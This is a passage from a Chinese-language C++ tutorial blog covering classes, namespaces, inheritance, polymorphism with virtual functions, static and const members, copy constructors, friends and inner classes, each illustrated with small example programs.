class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175528.png" alt="image-20201107222040456"></p><p><strong>注意:</strong></p><ul><li>通过malloc分配的对象free的时候不会调用析构函数</li><li>构造函数、析构函数要声明为public，才能被外界正常使用</li></ul><h2 id="声明和实现分离"><a href="#声明和实现分离" class="headerlink" title="声明和实现分离"></a>声明和实现分离</h2><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;&#x2F;&#x2F;声明class Person &#123;private:int m_age;public:void setAge(int age);int getAge();Person();~Person();&#125;;&#x2F;&#x2F;实现Person::Person() &#123; m_age &#x3D; 0;&#125;void Person::setAge(int age) &#123;this-&gt;m_age &#x3D; age;&#125;int Person::getAge() &#123;return this-&gt;m_age;&#125;Person::~Person() &#123;&#125;int main() &#123;Person person;person.setAge(1);cout &lt;&lt; person.getAge() &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175529.png" alt="image-20201107230225815"></p><p><strong>也可以将声明放在头文件中</strong></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175530.png" alt="image-20201107230351372"></p><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>命名空间可以用来避免命名冲突。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;namespace abc &#123;int g_age;class Person &#123;&#125;;void test() &#123;&#125;&#125;int main() &#123;abc::g_age &#x3D; 20;abc::Person* p &#x3D; new abc::Person();abc::test();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>namespace</code> 来定义命令空间。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175531.png" alt="image-20201108214705448"></p><p>为了方便，可以使用<code>using namespace</code>来规定命名空间的范围</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">using namespace abc;g_age &#x3D; 20;Person* p &#x3D; new Person();test();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175532.png" alt="image-20201108215051621"></p><p>命名空间可以嵌套和合并，c++中存在一个默认的全局命名空间<code>::</code>我们创建的命名空间默认都嵌套在它里面.</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;int g_age;namespace abc &#123;int g_age;class Person &#123;&#125;;void test() &#123;&#125;&#125;int main() &#123;::g_age &#x3D; 20;using namespace abc;::abc::g_age &#x3D; 70;Person* p &#x3D; new Person();test();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175533.png" alt="image-20201108220004472"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承，可以让子类拥有父类的所有成员（变量\函数）。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int age;void run() &#123;cout &lt;&lt; &quot;Person::run()&quot; &lt;&lt; endl;&#125;&#125;;class Student : public Person &#123;public:int class_num;void study() &#123;cout &lt;&lt; &quot;Student::study()&quot; &lt;&lt; endl;&#125;&#125;;int main() &#123;Student student;student.age &#x3D; 20;student.class_num &#x3D; 10;student.run();student.study();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175534.png" alt="image-20201108233435241"></p><p> <strong>关系描述</strong></p><ul><li>Student是子类（subclass，派生类）</li><li>Person是父类（superclass，超类）</li></ul><p>具体的继承关系可参考：<a href="https://www.runoob.com/cplusplus/cpp-inheritance.html">https://www.runoob.com/cplusplus/cpp-inheritance.html</a></p><p>继承对象的内存布局：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175535.png" alt="image-20201108233607597"></p><h2 id="成员访问权限"><a href="#成员访问权限" class="headerlink" title="成员访问权限"></a>成员访问权限</h2><p> <strong>成员访问权限、继承方式有3种：</strong></p><ul><li>public：公共的，任何地方都可以访问（struct默认）</li><li>protected：子类内部、当前类内部可以访问</li><li>private：私有的，只有当前类内部可以访问（class默认）</li></ul><p><strong>子类内部访问父类成员的权限，是以下2项中权限最小的那个</strong></p><ul><li>成员本身的访问权限</li><li>上一级父类的继承方式</li></ul><p>开发中用的最多的继承方式是public，这样能保留父类原来的成员访问权限</p><p>访问权限不影响对象的内存布局</p><p>具体的继承关系可参考：<a href="https://www.runoob.com/cplusplus/cpp-inheritance.html">https://www.runoob.com/cplusplus/cpp-inheritance.html</a></p><h2 id="初始化列表"><a href="#初始化列表" class="headerlink" title="初始化列表"></a>初始化列表</h2><p> <strong>特点</strong></p><ul><li>一种便捷的初始化成员变量的方式</li><li>只能用在构造函数中</li><li>初始化顺序只跟成员变量的声明顺序有关</li></ul><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Person &#123;public:int m_age;int m_height;Person(int age, int height) : m_age(age), m_height(height) &#123;&#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175536.png" alt="image-20201111184404488"></p><p>上述的这种写法就是初始化列表</p><p>它等价于：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Person &#123;public:int m_age;int m_height;Person(int age, int height) &#123;this-&gt;m_age &#x3D; age;this-&gt;m_height &#x3D; height;&#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="初始化列表与默认参数配合使用"><a href="#初始化列表与默认参数配合使用" class="headerlink" title="初始化列表与默认参数配合使用"></a>初始化列表与默认参数配合使用</h3><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int m_age;int m_height;Person(int age &#x3D; 0, int height &#x3D; 0) : m_age(age), m_height(height) &#123;cout &lt;&lt; m_age &lt;&lt; &quot; &quot; &lt;&lt; m_height &lt;&lt; endl;&#125;&#125;;int main() &#123;Person person1;Person person2(18);Person person3(18, 20);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175537.png" alt="image-20201111185105379"></p><p><strong>注意：</strong></p><p>如果函数声明和实现是分离的</p><ul><li>初始化列表只能写在函数的实现中</li><li>默认参数只能写在函数的声明中</li></ul><h3 id="构造函数的互相调用"><a href="#构造函数的互相调用" class="headerlink" title="构造函数的互相调用"></a>构造函数的互相调用</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int m_age;int m_height;Person() : Person(10,20) &#123;&#125;Person(int age , int height) : m_age(age), m_height(height) &#123;cout &lt;&lt; m_age &lt;&lt; &quot; &quot; &lt;&lt; m_height &lt;&lt; endl;&#125;&#125;;int main() &#123;Person person1;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175538.png" alt="image-20201111192707468"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175539.png" alt="image-20201111192717615"></p><h3 id="父类的构造函数"><a href="#父类的构造函数" class="headerlink" title="父类的构造函数"></a>父类的构造函数</h3><ul><li><p>子类的构造函数默认会调用父类的无参构造函数</p></li><li><p>如果子类的构造函数显式地调用了父类的有参构造函数，就不会再去默认调用父类的无参构造函数</p></li><li><p>如果父类缺少无参构造函数，子类的构造函数必须显式调用父类的有参构造函数</p></li></ul><h2 id="父类指针，子类指针"><a href="#父类指针，子类指针" class="headerlink" title="父类指针，子类指针"></a>父类指针，子类指针</h2><p>父类指针可以指向子类对象，是安全的，开发中经常用到（继承方式必须是public）。</p><p>子类指针指向父类对象是不安全的。</p><p>例：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175540.png" alt="image-20201111214646623"></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>默认情况下，编译器只会根据指针类型调用对应的函数，不存在多态。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Dog &#123;public:void speak() &#123;cout &lt;&lt; &quot;Dog::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Dog::run()&quot; &lt;&lt; endl;&#125;&#125;;class Cat &#123;public:void speak() &#123;cout &lt;&lt; &quot;Cat::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Cat::run()&quot; &lt;&lt; endl;&#125;&#125;;class Pig &#123;public:void speak() &#123;cout &lt;&lt; &quot;Pig::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Pig::run()&quot; &lt;&lt; endl;&#125;&#125;;void liu(Dog* p) &#123;p-&gt;run();p-&gt;speak();&#125;void liu(Cat* p) &#123;p-&gt;run();p-&gt;speak();&#125;void liu(Pig* p) &#123;p-&gt;run();p-&gt;speak();&#125;int main() &#123;liu(new Dog());liu(new Cat());liu(new Pig());return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面的例子中，虽然三只动物都有共同的属性 run 和 speak，但是我们定义的三个函数在表达三只动物的run和speak。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175541.png" alt="image-20201111222221438"></p><p>那能否在定义一个Animal 父类，让三只动物都继承其run和speak呢？</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Animal &#123;public:void speak() &#123;cout &lt;&lt; &quot;Animal::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Animal::run()&quot; &lt;&lt; endl;&#125;&#125;;class Dog : public Animal&#123;public:void speak() &#123;cout &lt;&lt; &quot;Dog::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Dog::run()&quot; &lt;&lt; endl;&#125;&#125;;class Cat : public  Animal &#123;public:void speak() &#123;cout &lt;&lt; &quot;Cat::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Cat::run()&quot; &lt;&lt; endl;&#125;&#125;;class Pig : public  Animal &#123;public:void speak() &#123;cout &lt;&lt; &quot;Pig::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Pig::run()&quot; &lt;&lt; endl;&#125;&#125;;&#x2F;&#x2F;父指针指向子类对象void liu(Animal * p) &#123;p-&gt;run();p-&gt;speak();&#125;int main() &#123;liu(new Dog());liu(new Cat());liu(new Pig());return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175542.png" alt="image-20201111222728124"></p><p>但是结果确不正确，因为<strong>默认情况下，编译器只会根据指针类型调用对应的函数，不存在多态</strong>。</p><p> <strong>多态的要素：</strong></p><ul><li>子类重写父类的成员函数（override）</li><li>父类指针指向子类对象</li><li>利用父类指针调用重写的成员函数</li></ul><p><strong>多态是面向对象非常重要的一个特性</strong></p><ul><li>同一操作作用于不同的对象，可以有不同的解释，产生不同的执行结果</li><li>在运行时，可以识别出真正的对象类型，调用对应子类中的函数</li></ul><p>如何实现多态呢？在c++中需要使用虚函数来实现。</p><h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p>C++中的多态通过虚函数（virtual function）来实现。</p><p>虚函数：被virtual修饰的成员函数。</p><p>只要在父类中声明为虚函数，子类中重写的函数也自动变成虚函数（也就是说子类中可以省略virtual关键字）。</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Animal &#123;public:virtual void speak() &#123;cout &lt;&lt; &quot;Animal::speak()&quot; &lt;&lt; endl;&#125;virtual void run() &#123;cout &lt;&lt; &quot;Animal::run()&quot; &lt;&lt; endl;&#125;&#125;;class Dog : public Animal&#123;public:void speak() &#123;cout &lt;&lt; &quot;Dog::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Dog::run()&quot; &lt;&lt; endl;&#125;&#125;;class Cat : public  Animal &#123;public:void speak() &#123;cout &lt;&lt; &quot;Cat::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Cat::run()&quot; &lt;&lt; endl;&#125;&#125;;class Pig : public  Animal &#123;public:void speak() &#123;cout &lt;&lt; &quot;Pig::speak()&quot; &lt;&lt; endl;&#125;void run() &#123;cout &lt;&lt; &quot;Pig::run()&quot; &lt;&lt; endl;&#125;&#125;;void liu(Animal * p) &#123;p-&gt;run();p-&gt;speak();&#125;int main() &#123;liu(new Dog());liu(new Cat());liu(new Pig());return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175543.png" alt="image-20201111230748704"></p><h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>虚函数的实现原理是虚表，这个虚表里面存储着最终需要调用的虚函数地址，这个虚表也叫虚函数表。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175544.png" alt="image-20201112120207320"></p><h3 id="虚析构函数"><a href="#虚析构函数" class="headerlink" title="虚析构函数"></a>虚析构函数</h3><p> 如果存在父类指针指向子类对象的情况，应该将析构函数声明为虚函数（虚析构函数）</p><p>delete父类指针时，才会调用子类的析构函数，保证析构的完整性。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175545.png" alt="image-20201112143137618"></p><h3 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h3><p>纯虚函数：没有函数体且初始化为0的虚函数，用来定义接口规范</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175546.png" alt="image-20201112154021614"></p><p><strong>抽象类（Abstract Class）</strong></p><ul><li>含有纯虚函数的类，不可以实例化（不可以创建对象）</li><li>抽象类也可以包含非纯虚函数、成员变量</li><li>如果父类是抽象类，子类没有完全重写纯虚函数，那么这个子类依然是抽象类</li></ul><h2 id="静态成员"><a href="#静态成员" class="headerlink" title="静态成员"></a>静态成员</h2><p> 静态成员：被static修饰的成员变量\函数。</p><p>可以通过对象（对象.静态成员）、对象指针（对象指针-&gt;静态成员）、类访问（类名::静态成员）。</p><h3 id="静态成员变量"><a href="#静态成员变量" class="headerlink" title="静态成员变量"></a>静态成员变量</h3><ul><li>存储在数据段（全局区，类似于全局变量），整个程序运行过程中只有一份内存</li><li>对比全局变量，它可以设定访问权限（public、protected、private），达到局部共享的目的</li><li>必须初始化，必须在类外面初始化，初始化时不能带static，如果类的声明和实现分离（在实现.cpp中初始化）</li></ul><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Car &#123;public:static int m_price;void run() &#123;cout &lt;&lt; &quot;run()&quot; &lt;&lt; endl;&#125;&#125;;&#x2F;&#x2F;在类外面初始化静态成员变量int Car::m_price &#x3D; 10;int main() &#123;Car car1;car1.m_price &#x3D; 100;cout &lt;&lt; car1.m_price &lt;&lt; endl;cout &lt;&lt; Car::m_price &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175547.png" alt="image-20201112165215454"></p><h3 id="静态成员函数"><a href="#静态成员函数" class="headerlink" title="静态成员函数"></a>静态成员函数</h3><ul><li>内部不能使用this指针（this指针只能用在非静态成员函数内部）</li><li>不能是虚函数（虚函数只能是非静态成员函数）</li><li>内部不能访问非静态成员变量\函数，只能访问静态成员变量\函数</li><li>非静态成员函数内部可以访问静态成员变量\函数</li><li>构造函数、析构函数不能是静态</li><li>当声明和实现分离时，实现部分不能带static</li></ul><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Car &#123;public:static int m_price;static void run() &#123;cout &lt;&lt; &quot;run()&quot; &lt;&lt; endl;&#125;&#125;;&#x2F;&#x2F;在类外面初始化静态成员变量int Car::m_price &#x3D; 10;int main() &#123;Car car1;car1.run();Car * p &#x3D; new Car();p-&gt;run();Car::run();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175548.png" alt="image-20201112165924750"></p><h3 id="静态成员应用"><a href="#静态成员应用" class="headerlink" title="静态成员应用"></a>静态成员应用</h3><p>例：</p><p>现在有个需求是统计创建了多少个Car对象。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Car &#123;private:static int m_count;public:Car() &#123;m_count++;&#125;~Car() &#123;m_count--;&#125;static int getCount() &#123;return m_count;&#125;&#125;;&#x2F;&#x2F;在类外面初始化静态成员变量int Car::m_count &#x3D; 0;Car g_car;  &#x2F;&#x2F;创建了第一个Car对象int main() &#123;Car car1;  &#x2F;&#x2F;创建了第二个Car对象Car * p &#x3D; new Car();  &#x2F;&#x2F;创建了第三个Car对象cout &lt;&lt; Car::getCount() &lt;&lt; endl;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175549.png" alt="image-20201112211102622"></p><h2 id="const-成员"><a href="#const-成员" class="headerlink" title="const 成员"></a>const 成员</h2><p>const成员：被const修饰的成员变量、非静态成员函数。</p><p><strong>const成员变量</strong></p><ul><li><p>必须初始化（类内部初始化），可以在声明的时候直接初始化赋值</p></li><li><p>非static的const成员变量还可以在初始化列表中初始化</p><p>const成员函数（非静态）</p></li></ul><p><strong>const关键字写在参数列表后面，函数的声明和实现都必须带const</strong></p><ul><li>内部不能修改非static成员变量</li><li>内部只能调用const成员函数、static成员函数</li><li>  非const成员函数可以调用const成员函数</li></ul><p>const成员函数和非const成员函数构成重载<br>非const对象（指针）优先调用非const成员函数<br>const对象（指针）只能调用const成员函数、static成员函数</p><h2 id="引用类型成员"><a href="#引用类型成员" class="headerlink" title="引用类型成员"></a>引用类型成员</h2><p>引用类型成员变量必须初始化（不考虑static情况）</p><ul><li>在声明的时候直接初始化</li><li>通过初始化列表初始化</li></ul><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175550.png" alt="image-20201117173904291"></p><h2 id="拷贝构造函数（Copy-Constructor）"><a href="#拷贝构造函数（Copy-Constructor）" class="headerlink" title="拷贝构造函数（Copy Constructor）"></a>拷贝构造函数（Copy Constructor）</h2><p>拷贝构造函数是构造函数的一种.</p><p> 当利用已存在的对象创建一个新对象时（类似于拷贝），就会调用新对象的拷贝构造函数进行初始化.</p><p>拷贝构造函数的格式是固定的，接收一个const引用作为参数.</p><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Car &#123;int m_price;int m_length;public:Car(int price &#x3D; 0, int length &#x3D; 0) :m_price(price), m_length(length) &#123;cout &lt;&lt; &quot;Car(int price &#x3D; 0, int length &#x3D; 0)&quot; &lt;&lt; endl;&#125;&#x2F;&#x2F;拷贝构造函数，格式固定Car(const Car &amp;car) &#123;cout &lt;&lt; &quot;Car(const Car &amp;car)&quot; &lt;&lt; endl;&#125;void display() &#123;cout &lt;&lt; &quot;price&#x3D;&quot; &lt;&lt; m_price &lt;&lt; &quot;, length&#x3D;&quot; &lt;&lt; m_length &lt;&lt; endl;&#125;&#125;;int main() &#123;Car car1;Car car2(100);Car car3(100, 50);&#x2F;&#x2F;利用已经存在的car3对象创建了一个car4新对象&#x2F;&#x2F;car4初始化时只会调用拷贝构造函数Car car4(car3);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175551.png" alt="image-20201117211100223"></p><p>默认情况下不写拷贝构造函数也可以进行拷贝</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175552.png" alt="image-20201117211236889"></p><h3 id="调用父类的拷贝构造函数"><a href="#调用父类的拷贝构造函数" class="headerlink" title="调用父类的拷贝构造函数"></a>调用父类的拷贝构造函数</h3><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Person &#123;public:int m_age;Person(int age&#x3D;0) :m_age(age)&#123;&#125;&#x2F;&#x2F;父类的拷贝构造函数Person(const Person &amp;person) :m_age(person.m_age)&#123;&#125;&#125;;class Student : public Person &#123;public:int m_score;&#x2F;&#x2F;子类调用父类的构造函数Student(int age&#x3D;0, int score&#x3D;0) :Person(age), m_score(score)&#123;&#125;&#x2F;&#x2F;子类调用父类的拷贝构造函数Student(const Student &amp;student) :Person(student), m_score(student.m_score)&#123;&#125;&#125;;int main()&#123;Student student1(10, 100);Student student2(student1);cout &lt;&lt; student2.m_age &lt;&lt; endl;cout &lt;&lt; student2.m_score &lt;&lt; endl;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175553.png" alt="image-20201118215515501"></p><p>默认情况下不写拷贝构造函数也可以调用父类的拷贝构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175554.png" alt="image-20201118215642294"></p><h3 id="浅拷贝和深拷贝"><a href="#浅拷贝和深拷贝" class="headerlink" title="浅拷贝和深拷贝"></a>浅拷贝和深拷贝</h3><p>编译器默认的提供的拷贝是浅拷贝（shallow copy）</p><ul><li>将一个对象中所有成员变量的值拷贝到另一个对象</li><li>如果某个成员变量是个指针，只会拷贝指针中存储的地址值，并不会拷贝指针指向的内存空间</li><li>可能会导致堆空间多次free的问题</li></ul><p>如果需要实现深拷贝（deep copy），就需要自定义拷贝构造函数</p><ul><li>将指针类型的成员变量所指向的内存空间，拷贝到新的内存空间</li></ul><h2 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h2><p>匿名对象：没有变量名、没有被指针指向的对象，用完后马上调用析构</p><h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>友元包括友元函数和友元类</p><ul><li>如果将函数A（非成员函数）声明为类C的友元函数，那么函数A就能直接访问类C对象的所有成员</li><li> 如果将类A声明为类C的友元类，那么类A的所有成员函数都能直接访问类C对象的所有成员</li><li>友元破坏了面向对象的封装性，但在某些频繁访问成员变量的地方可以提高性能</li></ul><p>例：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Point &#123;int m_x;int m_y;public:int getX() &#123;return m_x;&#125;;int getY() &#123;return m_y;&#125;;Point(int x , int y): m_x(x),m_y(y)&#123;&#125;void display() &#123;cout &lt;&lt; &quot;(&quot; &lt;&lt; m_x &lt;&lt; &quot;, &quot; &lt;&lt; m_y &lt;&lt; &quot;)&quot; &lt;&lt;endl;&#125;&#125;;Point add(Point p1, Point p2) &#123;return Point(p1.getX() + p2.getX(), p1.getY() + p2.getY());&#125;int main() &#123;Point P1(10, 20);Point P2(20, 30);Point P3 &#x3D; add(P1, P2);P3.display();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175555.png" alt="image-20201120002440857"></p><p>上述代码使用了get方法去获取Point类中的私有成员变量，假设需要频繁的访问，可以将add方法设置为Point类的友元函数，这样add方法就可以直接访问Point类的私有成员变量。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;class Point &#123;friend Point add(Point p1, Point p2);int m_x;int m_y;public:int getX() &#123;return m_x;&#125;;int getY() &#123;return m_y;&#125;;Point(int x , int y): m_x(x),m_y(y)&#123;&#125;void display() &#123;cout &lt;&lt; &quot;(&quot; &lt;&lt; m_x &lt;&lt; &quot;, &quot; &lt;&lt; m_y &lt;&lt; &quot;)&quot; &lt;&lt;endl;&#125;&#125;;Point add(Point p1, Point p2) &#123;return Point(p1.m_x + p2.m_x, p1.m_y + p2.m_y);&#125;int main() &#123;Point P1(10, 20);Point P2(20, 30);Point P3 &#x3D; add(P1, P2);P3.display();return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images/picgo/20201122175556.png" alt="image-20201120002914113"></p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>如果将类A定义在类C的内部，那么类A就是一个内部类（嵌套类）。</p><p><strong>内部类的特点：</strong></p><ul><li><p>支持public、protected、private权限</p></li><li><p>成员函数可以直接访问其外部类对象的所有成员（反过来则不行）</p></li><li><p>成员函数可以直接不带类名、对象名访问其外部类的static成员</p></li><li><p>不会影响外部类的内存布局</p></li><li><p>可以在外部类内部声明，在外部类外面进行定义</p></li></ul><h2 id="局部类"><a href="#局部类" class="headerlink" 